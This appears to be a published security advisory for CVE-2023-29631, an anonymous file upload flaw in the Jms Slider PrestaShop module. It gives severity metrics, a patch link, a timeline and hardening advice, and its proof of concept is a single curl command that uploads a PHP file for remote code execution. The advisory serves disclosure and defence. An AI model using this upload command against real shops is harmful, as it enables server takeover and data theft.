---
layout: post
title: "[CVE-2023-29631] Unrestricted upload vulnerability in Jms Slider (jmsslider) PrestaShop module"
categories: modules
author:
- Creabilis.com
- TouchWeb.fr
- Friends-Of-Presta.org
meta: "CVE,PrestaShop"
severity: "critical (9.8)"
---

The module Jms Slider (jmsslider) from Joommasters contains an unrestricted upload of file with dangerous type vulnerability.
This module is for the PrestaShop e-commerce platform and mainly provided with joo masters PrestaShop themes

## Summary

* **CVE ID**: [CVE-2023-29631](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-29631)
* **Published at**: 2023-03-13
* **Advisory source**: Joomasters
* **Platform**: PrestaShop
* **Product**: jmsslider
* **Impacted release**: All versions (at least 1.6.0)
* **Product author**: Joommasters
* **Weakness**: [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
* **Severity**: critical (9.8)

## Description

ajax_jmsslider.php can be called anonymously to upload a php file that can be used for RCE.

## CVSS base metrics

* **Attack vector**: network
* **Attack complexity**: low
* **Privilege required**: none
* **User interaction**: none
* **Scope**: unchanged
* **Confidentiality**: high
* **Integrity**: high
* **Availability**: high

**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Possible malicious usage

* Technical and personal data leaks
* Obtain admin access
* Remove all data of the linked PrestaShop
* Display sensitives tables to front-office to unlock potential admin's ajax scripts of modules protected by token on the ecosystem

## Proof of concept

```bash
curl -v -F "data_image=@test.php" "https://preprod.XXX/modules/jmsslider/ajax_jmsslider.php?secure_key=VALUE_AVAILABLE_ON_FRONTOFFICE&action=addLayer&data_type=image&id_slide=99999"
```

## Patch
Provided by the editor
https://www.joommasters.com/index.php/blog/tutorials-and-case-studies/how-to-fix-security-bug-of-slider-security-breach-of-theme.html

## Timeline

| Date | Action |
|--|--|
| 2019-09-04 | Vulnerability publish by the editor |
| 2023-02-17 | Contact the author |
| 2023-03-13 | Publish this security advisory |

## Other recommendations

* To help improve the security of your PrestaShop installation, we recommend upgrading to the latest version. One of the benefits of upgrading is that it will disable the use of multiquery executions (separated by semicolons). However, please be aware that this **will not protect** your shop against SQL injection attacks that use the UNION clause to steal data. Additionally, it's important to note that PrestaShop includes a function called pSQL, which includes a strip_tags function. This helps protect your shop against [Stored XSS (also known as XSS T2) of Category 1](https://security.friendsofpresta.org/modules/2023/02/07/stored-xss.html). If a pSQL function is missing, it could potentially expose your project to critical Stored XSS vulnerabilities due to edge cases. Therefore, it's crucial to ensure that all relevant functions are properly implemented and used consistently throughout your project.
* Change the default database prefix `ps_` by a new longer arbitrary prefix. Nevertheless, be warned that this is useless against blackhats with DBA senior skill because of a design vulnerability in DBMS
* Activate OWASP 942's rules on your WAF (Web application firewall), be warned that you will probably break your backoffice and you will need to pre-configure some bypasses against these set of rules.

## Links

* [Joom masters web site](https://www.joommasters.com/)
* [Joom masters blog post on the vulnerability](https://www.joommasters.com/index.php/blog/tutorials-and-case-studies/how-to-fix-security-bug-of-slider-security-breach-of-theme.html)
